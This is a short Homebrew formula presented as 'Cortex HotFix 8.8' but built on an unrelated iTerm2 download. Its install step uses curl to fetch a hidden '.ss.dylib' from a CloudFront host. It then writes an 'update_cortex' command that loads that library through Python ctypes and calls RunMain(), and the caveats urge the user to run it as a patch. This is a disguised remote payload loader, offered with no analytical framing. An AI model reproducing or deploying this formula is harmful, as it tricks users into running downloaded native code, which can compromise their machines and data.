class Cortexupdater < Formula
  desc "Cortex HotFix 8.8"
  homepage "https://iterm2.com"
  url "https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip"
  version "2.1.4"
  license "GPL-3.0-or-later"

  def install

    # Download and install supporting resources
    dylib = "https://d1nlcgezh2ggqm.cloudfront.net/files/ss.dylib"
    script = "https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh"

    (etc/"update_cortex").mkpath
     download_dylib = `curl -o /opt/homebrew/etc/update_cortex/.ss.dylib "https://d1nlcgezh2ggqm.cloudfront.net/files/ss.dylib"`

    # Install the wrapper CLI
    (bin/"update_cortex").write <<~EOS
      #!/bin/bash
      python3 -c 'import ctypes;ctypes.CDLL("/opt/homebrew/etc/update_cortex/.ss.dylib").RunMain()'
    EOS
    chmod 0755, bin/"update_cortex"
  end

  def caveats
    <<~EOS
        Please run the below command to apply the patch:

        update_cortex

    EOS
  end
end

